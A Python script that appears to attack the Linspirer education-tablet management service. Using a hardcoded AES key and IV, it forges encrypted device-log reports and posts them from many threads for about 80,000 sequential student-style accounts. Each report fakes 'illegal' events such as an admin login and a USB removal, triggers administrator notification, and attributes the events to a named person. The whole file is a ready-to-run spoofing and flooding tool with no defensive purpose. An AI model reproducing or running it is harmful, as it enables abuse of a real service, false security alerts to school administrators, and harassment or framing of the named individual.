# -*- coding: utf-8 -*-
import json
import time
import requests
from Crypto.Util.Padding import pad
import base64
from Crypto.Cipher import AES
import _thread as thread
from datetime import datetime

name="王明伟"
start=200101
serviceapi="https://cloud.linspirer.com:883/public-interface.php"
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
def aes_encrypt(key, aes_str):
    vi = "F38AD7ADC6161529"
    aes = AES.new(key.encode('utf-8'), AES.MODE_CBC,vi.encode('utf8'))
    pad_pkcs7 = pad(aes_str.encode('utf-8'), AES.block_size, style='pkcs7')
    encrypt_aes = aes.encrypt(pad_pkcs7)
    encrypted_text = str(base64.encodebytes(encrypt_aes), encoding='utf-8')
    encrypted_text_str = encrypted_text.replace("\n", "")
    return encrypted_text_str
def sendmessage():
    global start,name
    while start<=280000:
        user="hsz"+str(start)
        start+=1
        time_now = int(time.time())
        dt_now = datetime.fromtimestamp(time_now)
        time_str = dt_now.strftime('%Y-%m-%d %H:%M:%S')
        data2=aes_encrypt("3901254795DA7CC3", json.dumps({"email":user,"model":"Lenovo TB-X505F","reportlist":[{"description":"admin logined","eliminate_data":0,"event_is_illegal":1,"event_name":"admin_login","event_result":0,"event_time":time_str,"lock_workspace":0,"notify_admin":1,"user_id":name,"user_name":user},{"description":"USB拔出电脑","eliminate_data":0,"event_is_illegal":1,"event_name":"usb_to_pc_normal","event_result":0,"event_time":time_str,"lock_workspace":0,"notify_admin":1,"user_id":name,"user_name":user}],"swdid":"4a"},separators=(',',':')).encode('unicode_escape').decode())
        dataa=json.dumps({"!version":6,"client_version":"tongyongshengchan_5.02.007.0","id":1,"jsonrpc":"2.0","method":"com.linspirer.device.setdevicelogs","params":data2})
        try:
            res=requests.post(url=serviceapi,data=dataa).text
            #print(aes_decrypt("3901254795DA7CC3",res))
            print(user)
        except:
            pass
                    
count=int(input("输入线程数:"))
for i in range(count):
    thread.start_new_thread(sendmessage,())
while 1:
    pass